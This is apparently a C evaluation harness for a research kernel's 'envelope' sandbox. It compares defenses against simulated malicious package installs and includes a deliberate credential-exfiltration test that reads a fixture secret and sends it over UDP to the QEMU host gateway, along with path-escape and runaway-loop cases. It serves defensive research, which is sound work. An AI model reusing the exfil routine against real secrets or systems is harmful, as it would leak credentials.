/* E2 pilot: package-install scenario matrix across defense mechanisms
 * (docs/research/10-evaluation.md §4.1 -- first paper-data experiment).
 *
 * Arms:   NONE / LANDLOCK-permissive / LANDLOCK-strict / ENVELOPE
 * Cells:  S0 benign install, A1 credential exfil, A2 runaway loop,
 *         A3 path escape, A4 stalled installer.
 *
 * Each cell forks a worker whose exit code encodes the observed outcome;
 * the parent compares it against the expectation derived from the paper's
 * necessity argument (docs/research/09 §4.5 question 5).  All cells green
 * => "ENVELOPE_PILOT: PASS".
 */
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>

#define SYS_a20_envelope_create     902
#define SYS_a20_envelope_enter      903
#define SYS_landlock_create_ruleset 444
#define SYS_landlock_add_rule       445
#define SYS_landlock_restrict_self  446

#define LL_RULE_PATH_BENEATH 1
#define LL_FS_WRITE_FILE (1ull << 1)
#define LL_FS_READ_FILE  (1ull << 2)
#define LL_FS_READ_DIR   (1ull << 3)

/* Must match kernel struct a20_env_policy (kernel/include/ipc/envelope.h). */
struct env_policy {
    unsigned int allowed_types;
    unsigned long long rights_by_class[32];
    unsigned long long time_budget_ns;
    unsigned long long op_budget;
    unsigned long long data_budget;
    unsigned int propagation_types;
    unsigned int flags;
};

/* Must match kernel landlock_attr_path_beneath_t (kernel/ipc/landlock.c). */
struct ll_attr_pb {
    unsigned long long allowed_access;
    int parent_fd;
};

#define OBJ_FILE 3
#define OBJ_PIPE 6
#define R_READ  (1ull << 0)
#define R_WRITE (1ull << 1)
#define R_STAT  (1ull << 3)
#define R_SEEK  (1ull << 4)

enum arm { ARM_NONE, ARM_LL_PERM, ARM_LL_STRICT, ARM_ENV, ARM_N };
enum scen { SC_S0, SC_A1, SC_A2, SC_A3, SC_A4, SC_N };

static const char *arm_name[ARM_N] = { "none", "ll-perm", "ll-strict",
                                       "envelope" };

static long g_env_id; /* supervisor-created envelope, inherited by fork */

static long env_create(struct env_policy *p)
{
    return syscall(SYS_a20_envelope_create, p, 0L);
}

static int env_enter(long id)
{
    return syscall(SYS_a20_envelope_enter, id) < 0 ? -1 : 0;
}

/* Install an allow-prefix landlock ruleset and restrict self.
 * Deny-by-default afterwards: every open outside `prefix` fails. */
static int ll_setup(const char *prefix, unsigned long long bits)
{
    unsigned long long handled = bits;
    long rs = syscall(SYS_landlock_create_ruleset, &handled,
                      (unsigned long)sizeof(handled), 0L);
    if (rs < 0)
        return -1;
    int dirfd = open(prefix, O_RDONLY | O_DIRECTORY);
    if (dirfd < 0) {
        close(rs);
        return -1;
    }
    struct ll_attr_pb attr = { bits, dirfd };
    long r = syscall(SYS_landlock_add_rule, rs, LL_RULE_PATH_BENEATH,
                     &attr, 0L);
    close(dirfd);
    if (r < 0) {
        close(rs);
        return -1;
    }
    r = syscall(SYS_landlock_restrict_self, rs, 0L);
    close(rs);
    return r < 0 ? -1 : 0;
}

static int setup_arm(int arm)
{
    unsigned long long rw = LL_FS_READ_FILE | LL_FS_WRITE_FILE |
                            LL_FS_READ_DIR;
    switch (arm) {
    case ARM_NONE:
        return 0;
    case ARM_LL_PERM:
        return ll_setup("/tmp/pilot", rw); /* whole scratch tree */
    case ARM_LL_STRICT:
        return ll_setup("/tmp/pilot/build", rw); /* build dir only */
    default:
        return env_enter(g_env_id);
    }
}

/* ---- scenarios (return standardized outcome codes) -------------------- */

/* S0 benign install: fetch source, stage into build/, write manifest.
 * 0 = installed; nonzero = blocked/failed. */
static int s0_benign(void)
{
    char buf[16];
    int src = open("/tmp/pilot/pkg/data.bin", O_RDONLY);
    if (src < 0)
        return 1;
    ssize_t n = read(src, buf, sizeof(buf));
    close(src);
    if (n <= 0)
        return 2;
    int out = open("/tmp/pilot/build/staged.bin",
                   O_CREAT | O_TRUNC | O_WRONLY, 0644);
    if (out < 0)
        return 3;
    if (write(out, buf, (size_t)n) != n) {
        close(out);
        return 4;
    }
    close(out);
    int man = open("/tmp/pilot/build/manifest.txt",
                   O_CREAT | O_TRUNC | O_WRONLY, 0644);
    if (man < 0)
        return 5;
    const char *m = "installed\n";
    if (write(man, m, strlen(m)) != (ssize_t)strlen(m)) {
        close(man);
        return 6;
    }
    close(man);
    return 0;
}

/* A1 credential exfil: read a secret, then open an outbound UDP channel
 * toward the QEMU host gateway.  Channel creation is the attack-success
 * metric (datagrams are fire-and-forget).
 * 0 = channel open (exfil succeeded); 13 = blocked (socket refused);
 * 11 = blocked (payload unreadable). */
static int a1_exfil(void)
{
    char secret[64];
    int fd = open("/tmp/pilot/secret.txt", O_RDONLY);
    if (fd < 0)
        return 11;
    ssize_t n = read(fd, secret, sizeof(secret));
    close(fd);
    if (n <= 0)
        return 11;

    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0)
        return 13;

    struct sockaddr_in dst;
    memset(&dst, 0, sizeof(dst));
    dst.sin_family = AF_INET;
    dst.sin_port = htons(9999);
    dst.sin_addr.s_addr = htonl((10u << 24) | 2u); /* QEMU host gateway */
    sendto(s, secret, (size_t)n, 0, (struct sockaddr *)&dst, sizeof(dst));
    close(s);
    return 0; /* exfil channel established */
}

/* A3 path escape: touch a file outside the install tree.
 * 0 = escape succeeded; 13 = blocked (path layer denied);
 * 14 = unexpected error. */
static int a3_escape(void)
{
    int fd = open("/tmp/pilot/outside.txt", O_CREAT | O_TRUNC | O_WRONLY,
                  0644);
    if (fd < 0)
        return errno == EACCES || errno == EPERM ? 13 : 14;
    write(fd, "e", 1);
    close(fd);
    return 0;
}

/* A4 stalled installer: acts only after its time budget has lapsed.
 * 0 = post-lapse operation correctly denied; 43 = operation succeeded
 * (mechanism has no time dimension); negative = harness failure. */
static int a4_stalled(int arm)
{
    if (arm == ARM_ENV && env_enter(g_env_id) < 0)
        return -1;
    int fd = open("/tmp/pilot/build/a4.txt", O_CREAT | O_TRUNC | O_RDWR,
                  0644);
    if (fd < 0)
        return errno == EACCES || errno == EPERM ? 0 : 42;
    if (write(fd, "early", 5) != 5) {
        int e = errno;
        close(fd);
        return e == EACCES || e == EPERM ? 0 : 42;
    }
    sleep(3); /* past the 1.5 s budget */
    char b[4];
    ssize_t r = read(fd, b, sizeof(b));
    int e = errno;
    close(fd);
    if (r >= 0)
        return 43; /* kept going */
    return e == EACCES || e == EPERM ? 0 : 42;
}

/* ---- per-cell worker body ---------------------------------------------- */

static void put_file(const char *path, const char *content)
{
    int fd = open(path, O_CREAT | O_TRUNC | O_WRONLY, 0644);
    if (fd < 0) {
        fprintf(stderr, "PILOT fixture %s: %s\n", path, strerror(errno));
        exit(2);
    }
    size_t n = strlen(content);
    if (write(fd, content, n) != (ssize_t)n)
        exit(2);
    close(fd);
}

/* Returns the worker exit code for one matrix cell. */
static int run_worker(int scen, int arm)
{
    int rc;
    switch (scen) {
    case SC_S0:
        if (setup_arm(arm) < 0)
            return 200;
        rc = s0_benign();
        break;
    case SC_A1:
        if (setup_arm(arm) < 0)
            return 200;
        rc = a1_exfil();
        break;
    case SC_A2: {
        if (setup_arm(arm) < 0)
            return 200;
        int fd = open("/tmp/pilot/build/log.txt",
                      O_CREAT | O_TRUNC | O_WRONLY, 0644);
        if (fd < 0)
            return errno == EACCES || errno == EPERM ? 0 : 201;
        int i;
        for (i = 0; i < 60; i++) {
            if (write(fd, "x", 1) != 1)
                break; /* mechanism stopped the runaway at iteration i */
        }
        close(fd);
        rc = i == 60 ? 60 : 100 + i; /* 60 = ran to cap; 100+i = stopped@i */
        break;
    }
    case SC_A3:
        if (setup_arm(arm) < 0)
            return 200;
        rc = a3_escape();
        break;
    default: /* SC_A4 */
        rc = a4_stalled(arm);
        break;
    }
    fflush(stdout);
    return rc;
}

/* Expected-outcome check per cell. */
static int check(int scen, int arm, int rc)
{
    switch (scen) {
    case SC_S0:
        /* strict kills the benign install; everyone else installs */
        return arm == ARM_LL_STRICT ? rc != 0 : rc == 0;
    case SC_A1:
        /* permissive world lets the exfil channel open; strict and
         * envelope block it -- possibly at different stages (11 =
         * payload unreadable under the narrow path scope, 13 = socket
         * refused), both count as denied */
        return arm == ARM_NONE || arm == ARM_LL_PERM ? rc == 0
                                                     : rc == 13 || rc == 11;
    case SC_A2:
        /* only the envelope's op budget stops the runaway */
        return arm == ARM_ENV ? (rc >= 100 && rc < 160)
                              : rc == 60;
    case SC_A3:
        /* path escapes: coarse-permissive and envelopes-without-path-
         * dimension let it through; strict denies.  Honest limitation of
         * the envelope v1 (composes with Landlock instead). */
        return arm == ARM_LL_STRICT ? rc == 13 : rc == 0;
    default: /* SC_A4 */
        /* only the envelope's time budget denies the stalled installer */
        return arm == ARM_ENV ? rc == 0 : rc == 43;
    }
}

static void policy_for(struct env_policy *p, int scen)
{
    memset(p, 0, sizeof(*p));
    p->allowed_types = 1u << OBJ_FILE;
    p->rights_by_class[OBJ_FILE] =
        R_READ | R_WRITE | R_STAT | R_SEEK;
    p->op_budget = scen == SC_A2 ? 12 : 25;
    p->data_budget = 4096;
    if (scen == SC_A4)
        p->time_budget_ns = 1500000000ull; /* 1.5 s */
}

int main(void)
{
    printf("ENVELOPE_PILOT: start\n");

    if (mkdir("/tmp/pilot", 0755) < 0 && errno != EEXIST)
        return 1;
    if (mkdir("/tmp/pilot/pkg", 0755) < 0 && errno != EEXIST)
        return 1;
    if (mkdir("/tmp/pilot/build", 0755) < 0 && errno != EEXIST)
        return 1;
    put_file("/tmp/pilot/pkg/data.bin", "PACKAGE_PAYLOAD_16BYTE");
    put_file("/tmp/pilot/secret.txt", "TOPSECRET-42");
    printf("ENVELOPE_PILOT: fixtures ready\n");

    static const char *scen_name[SC_N] = { "S0-benign", "A1-exfil",
                                           "A2-runaway", "A3-escape",
                                           "A4-stalled" };
    int failures = 0;

    for (int scen = 0; scen < SC_N; scen++) {
        for (int arm = 0; arm < ARM_N; arm++) {
            struct env_policy pol;
            policy_for(&pol, scen);
            g_env_id = arm == ARM_ENV ? env_create(&pol) : -1;
            if (arm == ARM_ENV && g_env_id < 0) {
                printf("ENVELOPE_PILOT: %s/%s FAIL (create)\n",
                       scen_name[scen], arm_name[arm]);
                failures++;
                continue;
            }
            pid_t p = fork();
            if (p < 0)
                return 1;
            if (p == 0)
                exit(run_worker(scen, arm));
            int st = 0;
            waitpid(p, &st, 0);
            if (!WIFEXITED(st)) {
                printf("ENVELOPE_PILOT: %s/%s FAIL (signal)\n",
                       scen_name[scen], arm_name[arm]);
                failures++;
                continue;
            }
            int rc = WEXITSTATUS(st);
            if (check(scen, arm, rc)) {
                printf("ENVELOPE_PILOT: %s/%s PASS (rc=%d)\n",
                       scen_name[scen], arm_name[arm], rc);
            } else {
                printf("ENVELOPE_PILOT: %s/%s FAIL (rc=%d)\n",
                       scen_name[scen], arm_name[arm], rc);
                failures++;
            }
        }
    }

    {
        /* G1: real-binary flow -- a full mksh script runs inside the
         * envelope; execve keeps the envelope attached (05 §2.4: execve
         * cannot shed it) and the script's own openat/write are mediated
         * like any other acquisition. */
        struct env_policy pg;
        policy_for(&pg, SC_S0);
        long idg = env_create(&pg);
        int syn[2];
        if (idg < 0 || pipe(syn) < 0)
            return 1;
        pid_t cg = fork();
        if (cg == 0) {
            close(syn[0]);
            if (env_enter(idg) < 0)
                _exit(151);
            char rdy = 'R';
            if (write(syn[1], &rdy, 1) != 1)
                _exit(152);
            execl("/bin/mksh", "mksh", "-c",
                  "echo ok > /tmp/pilot/build/mk.txt", (char *)0);
            _exit(153);
        }
        close(syn[1]);
        char rdyg;
        if (read(syn[0], &rdyg, 1) != 1)
            return 1;
        int stg = 0;
        waitpid(cg, &stg, 0);
        close(syn[0]);
        int fdm = open("/tmp/pilot/build/mk.txt", O_RDONLY);
        char bufm[4] = { 0 };
        int okg = WIFEXITED(stg) && WEXITSTATUS(stg) == 0 && fdm >= 0 &&
                  read(fdm, bufm, 2) == 2 &&
                  (bufm[0] == 'o' && bufm[1] == 'k');
        if (fdm >= 0)
            close(fdm);
        unlink("/tmp/pilot/build/mk.txt");
        if (okg) {
            printf("ENVELOPE_PILOT: mksh-flow PASS\n");
        } else {
            printf("ENVELOPE_PILOT: mksh-flow FAIL st=%d\n", stg);
            failures++;
        }
    }

    {
        /* G2: multi-process pipeline flow -- one shared envelope spans an
         * entire mksh pipeline: pipe2 acquisition (A3) twice by the
         * shell, fork inheritance for every segment (05 §2.3 v1 shared
         * root), execve retention, and openat+write USE charging on the
         * final redirect -- all mediated across three processes using
         * builtins only (no external-binary dependency). */
        struct env_policy pp;
        policy_for(&pp, SC_S0);
        pp.allowed_types |= 1u << OBJ_PIPE;
        pp.rights_by_class[OBJ_PIPE] = R_READ | R_WRITE | R_STAT;
        long idp = env_create(&pp);
        int synp[2];
        if (idp < 0 || pipe(synp) < 0)
            return 1;
        pid_t cp = fork();
        if (cp == 0) {
            close(synp[0]);
            if (env_enter(idp) < 0)
                _exit(161);
            char rdy = 'R';
            if (write(synp[1], &rdy, 1) != 1)
                _exit(162);
            execl("/bin/mksh", "mksh", "-c",
                  "echo hi | { read x; print -r -- \"$x\"; } | "
                  "{ read y; print -r -- \"$y\" > /tmp/pilot/build/pipe.txt; }",
                  (char *)0);
            _exit(163);
        }
        close(synp[1]);
        char rdyp;
        if (read(synp[0], &rdyp, 1) != 1)
            return 1;
        int stp = 0;
        waitpid(cp, &stp, 0);
        close(synp[0]);
        int fdq = open("/tmp/pilot/build/pipe.txt", O_RDONLY);
        char bufq[4] = { 0 };
        int okp = WIFEXITED(stp) && WEXITSTATUS(stp) == 0 && fdq >= 0 &&
                  read(fdq, bufq, 2) == 2 &&
                  (bufq[0] == 'h' && bufq[1] == 'i');
        if (fdq >= 0)
            close(fdq);
        unlink("/tmp/pilot/build/pipe.txt");
        if (okp) {
            printf("ENVELOPE_PILOT: pipe-flow PASS\n");
        } else {
            printf("ENVELOPE_PILOT: pipe-flow FAIL st=%d\n", stp);
            failures++;
        }
    }

    if (failures == 0) {
        printf("ENVELOPE_PILOT: PASS\n");
        return 0;
    }
    printf("ENVELOPE_PILOT: FAIL cells=%d\n", failures);
    return 1;
}
